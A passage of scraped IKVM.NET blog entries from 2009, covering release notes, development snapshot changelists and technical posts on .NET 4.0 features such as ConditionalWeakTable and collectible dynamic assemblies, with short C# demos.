<TD style="BORDER-BOTTOM: black 1px solid">Image content handlers not implemented.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.print, for example, means that the API is there but there is no back-end to provide the actual printing support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). 
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). 
<LI>java.lang.String.intern() strings are never garbage collected. 
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. 
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. 
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). 
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. 
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. 
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>There is experimental support for running in partial trust.<BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/05/2009 15:32:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9aa75bec-7b19-47a0-abf2-a28756e5e080"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9aa75bec-7b19-47a0-abf2-a28756e5e080">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 02 June 2009</h2></div>
<div class="newsItems"><a name="a230eb091-659b-49f8-8dbc-fbd5e8946538"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Class gc support has now been checked in (but is not available in the attached binaries, because they've been built for .NET 2.0). This is somewhat of a milestone snapshot, because it is the first version that no longer requires GNU Classpath to build*. However, please note that AWT / Swing still needs a lot of work.</P>
<P>*What this means is that there is no longer an external dependency on GNU Classpath. There is still GNU Classpath derived code in ikvm's source tree. For example, small parts of AWT and the pure Java&nbsp; implementation of java.util.zip.</P>
<P>Changes:</P>
<UL>
<LI>Removed dependency on classpath-0.95-stripped.zip. All AWT / Swing code is now from OpenJDK or in the ikvm codebase.</LI>
<LI>Defined NET_4_0 when building on .NET 4.0 to enable conditional code.</LI>
<LI>Changed IKVM.Reflection.Emit's ModuleBuilder and AssemblyBuilder to extends Module and Assembly respectively when building on .NET 4.0.</LI>
<LI>Added .NET 4.0 fix to IKVM.Reflection.Emit (for the fact that Type now defines == operator).</LI>
<LI>Fixed locking for image based Graphics.</LI>
<LI>Various changes to remove warnings when building on .NET 4.0.</LI>
<LI>Several fixes related to dynamic assemblies.</LI>
<LI>Several improvements to better work in partial trust.</LI>
<LI>More AWT work.</LI>
<LI>Made java.lang.reflect.Field exception messages the same as JDK 6.</LI>
<LI>Implemented class gc (for .NET 4.0 builds).</LI>
<LI>Added -Xnoclassgc option to ikvm (only meaningful in a .NET 4.0 build).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.41.3440.zip">ikvmbin-0.41.3440.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/02/2009 10:49:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=230eb091-659b-49f8-8dbc-fbd5e8946538"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=230eb091-659b-49f8-8dbc-fbd5e8946538">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 29 May 2009</h2></div>
<div class="newsItems"><a name="a7f47ad08-cdef-4dc2-b2fd-5dfdc1baf11d"></a><div class="entry">
	<h3 class="entryTitle">.NET 4.0 -- System.Runtime.CompilerServices.ConditionalWeakTable</h3>
	<div class="entryBody">
		<P>Back in the PDC build of .NET 4.0 another interesting new feature was introduced: <A href="http://msdn.microsoft.com/en-us/library/dd287757(VS.100).aspx">ConditionalWeakTable&lt;TKey, TValue&gt;</A>. This is a special purpose dictionary to associate objects with other objects. It was introduced to help the <A href="http://www.codeplex.com/dlr">DLR</A>, which needs the ability to add properties to arbitrary objects. The documentation is pretty clear and the <A href="http://blogs.msdn.com/clrteam/archive/2009/05/18/the-conditional-weak-table-enabling-dynamic-object-properties.aspx">CLR team blog</A> also has some info on it, so I won't rehash that. Instead I'll just mention that ConditionalWeakTable itself is not a magic type (i.e. the runtime knows nothing about it), but instead it is built on top of a private value type System.Runtime.Compiler.Services.DependentHandle. DependentHandle is essentially a handle based <A href="http://en.wikipedia.org/wiki/Ephemeron">ephemeron</A> implementation.</P>
<P><B>JVM vs CLR</B></P>
<P>This means that the CLR now comes a bit closer to the JVM in terms of memory management features. The JVM has had some very interesting reference types for a long time (<A href="http://java.sun.com/javase/6/docs/api/java/lang/ref/WeakReference.html">WeakReference</A>, <A href="http://java.sun.com/javase/6/docs/api/java/lang/ref/SoftReference.html">SoftReference</A> and <A href="http://java.sun.com/javase/6/docs/api/java/lang/ref/PhantomReference.html">PhantomReference</A>) and the ability to have these references posted to a <A href="http://java.sun.com/javase/6/docs/api/java/lang/ref/ReferenceQueue.html">ReferenceQueue</A> by the GC when the relevant change in reachability to the referenced object occurs.</P>
<P>Unfortunately there still isn't parity between the CLR and JVM, even though the CLR now provides a capability the JVM doesn't.</P>
<TABLE border=0 cellSpacing=0>
<TBODY>
<TR>
<TD><B>Java</B></TD>
<TD><B>.NET</B></TD>
<TD><B>Notes</B></TD></TR>
<TR style="BACKGROUND: #eee">
<TD>ReferenceQueue</TD>
<TD>n/a</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>WeakReference</TD>
<TD>WeakReference (short)</TD>
<TD>.NET has no ReferenceQueue equivalent notification mechanism.</TD></TR>
<TR style="BACKGROUND: #eee">
<TD>n/a</TD>
<TD>WeakReference (long)&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD></TD></TR>
<TR>
<TD>SoftReference</TD>
<TD>n/a</TD>
<TD>&nbsp;</TD></TR>
<TR style="BACKGROUND: #eee">
<TD>PhantomReference&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD>n/a</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD>WeakHashMap</TD>
<TD>n/a</TD>
<TD>&nbsp;</TD></TR>
<TR style="BACKGROUND: #eee">
<TD>n/a</TD>
<TD>ConditionalWeakTable</TD>
<TD>&nbsp;</TD></TR></TBODY></TABLE>
<P>(If you think that Java's WeakHashMap and .NET's ConditionalWeakTable are similar, consider that ConditionalWeakTable is <A href="http://en.wikipedia.org/wiki/Ephemeron">ephemeron</A> based. Plus the fact that WeakHashMap uses <A href="http://msdn.microsoft.com/en-us/library/ms404247.aspx">short weak references</A> and ConditionalWeakTable uses long weak references.)</P>
<P><B>IKVM.NET</B></P>
<P>ConditionalWeakTable is very useful for IKVM in several places:</P>
<UL>
<LI>Used to support class unloading by mapping Assembly to ClassLoader.</LI>
<LI>Used in caching of MethodBase properties.</LI>
<LI>Can be used to track the type of ghost arrays.</LI>
<LI>Can be used to more efficiently implement adding references to a ReferenceQueue.</LI></UL>
<P><B>Java</B></P>
<P>Given the effort going into Java 7 to improve support for dynamic languages it would not be surprising nor unwelcome to see ephemerons being added to the JVM.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/29/2009 08:08:54 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7f47ad08-cdef-4dc2-b2fd-5dfdc1baf11d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7f47ad08-cdef-4dc2-b2fd-5dfdc1baf11d">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 27 May 2009</h2></div>
<div class="newsItems"><a name="ae53ece91-5d47-4769-b760-4d871f700e71"></a><div class="entry">
	<h3 class="entryTitle">Class Unloading</h3>
	<div class="entryBody">
		<P>I never thought I'd see the day, but it has arrived:</P>
<P><CODE><FONT color=#0000ff>using</FONT> System;<BR><FONT color=#0000ff>using</FONT> java.net;<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>ClassGC</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>static void</FONT> Main(<FONT color=#0000ff>string</FONT>[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>URLClassLoader</FONT> loader = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>URLClassLoader</FONT>(<FONT color=#0000ff>new</FONT> <FONT color=#2b91af>URL</FONT>[] { <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>URL</FONT>(<FONT color=#a31515>"file:/c:/j/"</FONT>) });<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>WeakReference</FONT> weak = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>WeakReference</FONT>(loader);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>object</FONT> obj = loader.loadClass(<FONT color=#a31515>"test"</FONT>).newInstance();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(obj);;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>GC</FONT>.Collect();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(weak.Target);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#008000>//GC.KeepAlive(obj);<BR></FONT>&nbsp; }<BR>}</CODE></P>
<P>Running this on .NET 4.0 (with references to a version of IKVM 0.41 in which I've prototyped support for class gc):<BR><STRONG>(Don't forget to run in Release mode, otherwise the JIT will extend the lifetime of the local variables to the end of the method.)</STRONG></P>
<P><IMG src="http://www.frijters.net/classgc1.png"></P>
<P>Uncomment the GC.KeepAlive(obj) line to show that the object instance really does keep alive the class loader (and all associated IKVM and .NET infrastructure):</P>
<P><IMG src="http://www.frijters.net/classgc2.png"></P>
<P>Source + binaries (remember this is prototype level code): <A href="http://www.frijters.net/ikvm-classgc-prototype.zip">ikvm-classgc-prototype.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/27/2009 07:31:59 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e53ece91-5d47-4769-b760-4d871f700e71"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e53ece91-5d47-4769-b760-4d871f700e71">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 25 May 2009</h2></div>
<div class="newsItems"><a name="a7e0740e1-49fa-48fd-bbd9-4d66a92ad7c8"></a><div class="entry">
	<h3 class="entryTitle">Development Snapshot</h3>
	<div class="entryBody">
		<P><STRONG>.NET 4.0</STRONG></P>
<P>I wasn't sure whether to release a snapshot or not, because things are still very much in flux, but I decided that the ability to build on .NET 4.0 was a big enough feature to at least warrant a development snapshot (albeit a source snapshot this time).</P>
<P>I had to make a number of changes to be able to build on .NET 4.0:</P>
<UL>
<LI><A href="http://msdn.microsoft.com/en-us/library/system.type(VS.100).aspx">System.Type</A> now overloads the <A href="http://msdn.microsoft.com/en-us/library/system.type.op_equality(VS.100).aspx">== operator</A>, so TypeBase.Equals had to be modified to use <A href="http://msdn.microsoft.com/en-us/library/system.object.referenceequals(VS.100).aspx">ReferenceEquals</A> to avoid infinite recursion. 
<LI>Apply the <A href="http://msdn.microsoft.com/en-us/library/system.security.securityrulesattribute(VS.100).aspx">SecurityRules</A>(<A href="http://msdn.microsoft.com/en-us/library/system.security.securityruleset(VS.100).aspx">Level1</A>) attribute to IKVM.Runtime.dll to opt out of the new security model. This is needed because IKVM.Runtime.dll has the AllowPartiallyTrustedCallers and SecurityCritical attributes. 
<LI>Modify ikvmc and the runtime to apply the SecurityRules(Level1) attribute to all generated assemblies to opt out of the new security model to work around a (likely) bug in .NET 4.0. Special thanks to <A href="http://blogs.msdn.com/shawnfa/">Shawn Farkas</A> for helping with this. 
<LI>Modify JNI code to move RuntimeMethodHandle from unmanaged to managed data. 
<LI>Changed IKVM.Reflection.Emit to write current runtime version into module header instead of a hardcoded "v2.0.50727".</LI></UL>
<P><B>Visual Studio 2010</B></P>
<P>Building with Visual Studio was never supported and it still isn't. You need to build with NAnt ("nant clean &amp;&amp; nant"). You can use Visual Studio 2010 to edit the source and do test compiles (after first building with NAnt to make sure the required files are all there). If you want to use nant to build on .NET 4.0 you'll have to modify NAnt.exe.config to add the net-4.0 target framework and add a &lt;supportedRuntime ... /&gt; line to the &lt;startup&gt; section.</P>
<P><B>Changes</B></P>
<UL>
<LI>Many AWT / Swing related changes as Volker continues to merge in OpenJDK code. 
<LI>Fixed java.io.File.list() to not throw a System.NotSupportedException for certain invalid paths. 
<LI>Added workaround for .NET C# compiler bug that prevents it from subclassing a Java class that implements a protected abstract method using a public method. This workaround is required to build IKVM.AWT.WinForms.dll, but the Mono C# compiler has a related bug that I have not been able to work around. Filed Mono Bug&nbsp;<A href="https://bugzilla.novell.com/show_bug.cgi?id=506757">#506757</A>. 
<LI>Added support for java.io.File.list() to VFS. 
<LI>Added support for declarative security attributes on assemblies and types. 
<LI>Added some sun.misc.Unsafe methods that appear to be used by JRuby. 
<LI>Various fixes for .NET 4.0 beta 1. 
<LI>Removed code that supports .NET 2.0 RTM (SP1 is now required).</LI></UL>
<P>The source-only snapshot is availabe here: <A href="http://www.frijters.net/ikvmsrc-0.41.3432.zip">ikvmsrc-0.41.3432.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/25/2009 07:10:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7e0740e1-49fa-48fd-bbd9-4d66a92ad7c8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7e0740e1-49fa-48fd-bbd9-4d66a92ad7c8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 22 May 2009</h2></div>
<div class="newsItems"><a name="a0df57cfc-1028-42c0-a706-c5f1bac529d0"></a><div class="entry">
	<h3 class="entryTitle">.NET 4.0 -- AssemblyBuilderAccess.RunAndCollect</h3>
	<div class="entryBody">
		<P>This week .NET 4.0 beta 1 was released. I've been playing around with it a little bit and was very excited to find a new Reflection.Emit feature. If you're a reflection nut like me, the title of this blog entry probably already gave it away. Dynamic assemblies can now be garbage collected!</P>
<P><B>A Little Demo</B></P>
<P>Running this simple example will show that a System.Type instance is created and then garbage collected.</P>
<P><CODE><FONT color=#0000ff>using</FONT> System;<BR><FONT color=#0000ff>using</FONT> System.Reflection;<BR><FONT color=#0000ff>using</FONT> System.Reflection.Emit;<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>RunAndCollectDemo</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>static void</FONT> Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Type</FONT> type = CreateType();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>object</FONT> obj = <FONT color=#2b91af>Activator</FONT>.CreateInstance(type);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(obj);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>WeakReference</FONT> weak = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>WeakReference</FONT>(type);<BR>&nbsp;&nbsp;&nbsp; type = <FONT color=#0000ff>null</FONT>;<BR>&nbsp;&nbsp;&nbsp; obj = <FONT color=#0000ff>null</FONT>;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(<FONT color=#a31515>"type = "</FONT> + weak.Target);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>GC</FONT>.Collect();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(<FONT color=#a31515>"type = "</FONT> + weak.Target);<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>static</FONT> <FONT color=#2b91af>Type</FONT> CreateType()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AssemblyBuilder</FONT> ab =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AppDomain</FONT>.CurrentDomain.DefineDynamicAssembly(<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>AssemblyName</FONT>(<FONT color=#a31515>"foo"</FONT>),<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="BACKGROUND-COLOR: #ffff00"><FONT color=#2b91af>AssemblyBuilderAccess</FONT>.RunAndCollect</SPAN>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ModuleBuilder</FONT> modb = ab.DefineDynamicModule(<FONT color=#a31515>"foo.dll"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>TypeBuilder</FONT> tb = modb.DefineType(<FONT color=#a31515>"Foo"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> tb.CreateType();<BR>&nbsp; }<BR>}</CODE></P>
<P>As you can imagine, this required some pretty deep runtime changes. One of them is that <A href="http://msdn.microsoft.com/en-us/library/system.runtimemethodhandle.aspx">RuntimeMethodHandle</A> is no longer a handle. Previously it contained an unmanaged pointer to the native CLR datastructure corresponding to the method, but now it contains a managed interface reference, because the corresponding method can be garbage collected (I haven't looked into it, but I assume that the interface reference points either to a RuntimeMethodInfo <STRIKE>or in the case of a method in a RunAndCollect assembly a proxy that contains a weak reference to the RuntimeMethodInfo</STRIKE>. UPDATE: <A href="http://msdn.microsoft.com/en-us/library/dd554932(VS.100).aspx">A RuntimeMethodHandle represents a strong reference</A>.)</P>
<P>Somewhat ironically, this change breaks the compilation of ikvm's <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/runtime/JniInterface.cs?revision=1.69&amp;view=markup">JniInterface.cs</A>, because it stuffs a RuntimeMethodHandle in unmanaged memory. The&nbsp;fix is fairly straightforward (using a GCHandle to point to the MethodBase instead), but it does reveal an interesting property of C#, if you use unsafe code the (normally hidden) implementation details of managed value types can cause your code to break (and not because you explicitly depend on any internals).</P>
<P><B>What Does This Mean for IKVM.NET?</B></P>
<P>It would be really awesome if this feature could be used to finally make ClassLoaders garbage collectable, but unfortunately for that to happen <A href="/commentview.aspx?guid=54">this ancient bug</A> first has to be fixed.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/22/2009 07:26:20 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0df57cfc-1028-42c0-a706-c5f1bac529d0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0df57cfc-1028-42c0-a706-c5f1bac529d0">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 22 April 2009</h2></div>
<div class="newsItems"><a name="a926c9651-bb1c-49dd-9cc9-49157fc524f7"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.40 Release Candidate 1</h3>
	<div class="entryBody">
		<P>Thanks to Nat Luengnaruemitchai the MDB symbol writer has been fixed and finished and a couple of bugs were fixed.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.40.0.1.</LI>
<LI>Updated copyright notices in OpenJDK assemblies.</LI>
<LI>Fixed bug in workaround for <A href="https://bugzilla.novell.com/show_bug.cgi?id=486307">#486307</A> that could cause "duplicate MemberRef" warnings when running PEVerify on an ikvmc generated assembly.</LI>
<LI>Fixed bug <A href="https://sourceforge.net/tracker/?func=detail&amp;aid=2777128&amp;group_id=69637&amp;atid=525264">#2777128</A>.</LI>
<LI>Fixed bug <A href="https://sourceforge.net/tracker/?func=detail&amp;aid=2777171&amp;group_id=69637&amp;atid=525264">#2777171</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.40.0.1.zip">ikvmbin-0.40.0.1.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.40.0.1.zip">ikvm-0.40.0.1.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped-IKVM-0.40.zip">openjdk6-b12-stripped-IKVM-0.40.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/22/2009 07:03:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=926c9651-bb1c-49dd-9cc9-49157fc524f7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=926c9651-bb1c-49dd-9cc9-49157fc524f7">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 21 April 2009</h2></div>
<div class="newsItems"><a name="a77760aba-a035-406d-801d-0a747aa97a10"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>A couple of fixes and some more OpenJDK AWT/Swing merges.</P>
<P>Changes:</P>
<UL>
<LI>Fixed build regression introduced in previous snapshot caused by different build directory structure in OpenJDK 6 b16.</LI>
<LI>Handle Graphics2D.setPaint(null) correctly.</LI>
<LI>Integrated OpenJDK java/awt/image and java/awt/image/renderable packages.</LI>
<LI>Fixed duplicate MemberRefs generated by IKVM.Reflection.Emit caused by Mono workaround generic types not being canonicalized.</LI>
<LI>Integrated OpenJDK sun/swing and sun/awt packages.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.41.3398.zip">ikvmbin-0.41.3398.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/21/2009 08:03:55 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=77760aba-a035-406d-801d-0a747aa97a10"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=77760aba-a035-406d-801d-0a747aa97a10">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 16 April 2009</h2></div>
<div class="newsItems"><a name="a83441187-b021-4722-b601-977d40f900f5"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Even though 0.40 is still baking, I'm already working on the next version.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="http://blogs.sun.com/darcy/entry/openjdk_6_b16_source_bundle">OpenJDK 6 b16</A>. 
<LI>Changed decoded bytecode stream to use indexes in branches instead of PC offsets. 
<LI>Fixed .MDB debug symbol generation (thanks to Nat Luengnaruemitchai). 
<LI>Several AWT fixes contributed by Judit Vasko-Szedlar (Chemaxon). 
<LI>Moved jsr/ret bytecode processing into a seperate (inlining) pass to reduce complexity in the verifier and compiler. 
<LI>Fixed a bug in the compiler that caused exception handler to be dropped after an unreachable exception block was encountered. 
<LI>Updated copyright notices.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.41.3393.zip">ikvmbin-0.41.3393.zip</A><BR><BR>OpenJDK 6 b16 sources + build artifacts: <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/16/2009 12:26:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=83441187-b021-4722-b601-977d40f900f5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=83441187-b021-4722-b601-977d40f900f5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 06 April 2009</h2></div>
<div class="newsItems"><a name="aa3be92c5-69c6-462e-8910-3c334a775e20"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.40 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The eagerly anticipated (by some) first release candidate of 0.40 is ready!</P>
<P>Changes since previous snapshot:</P>
<UL>
<LI>Changed version to 0.40.0.0.</LI>
<LI>Added back RMI stubs that got left out in the module split.</LI>
<LI>Added cmm profiles and dummy color management implementation.</LI>
<LI>Fixed regression in ObjectInputStream.latestUserDefinedLoader().</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.40.0.0.zip">ikvmbin-0.40.0.0.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.40.0.0.zip">ikvm-0.40.0.0.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped-IKVM-0.40.zip">openjdk6-b12-stripped-IKVM-0.40.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/06/2009 11:05:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a3be92c5-69c6-462e-8910-3c334a775e20"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a3be92c5-69c6-462e-8910-3c334a775e20">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 27 March 2009</h2></div>
<div class="newsItems"><a name="adc37f6f1-7f5c-4698-a8d2-991e0ecd8cc6"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot -- Help Needed</h3>
	<div class="entryBody">
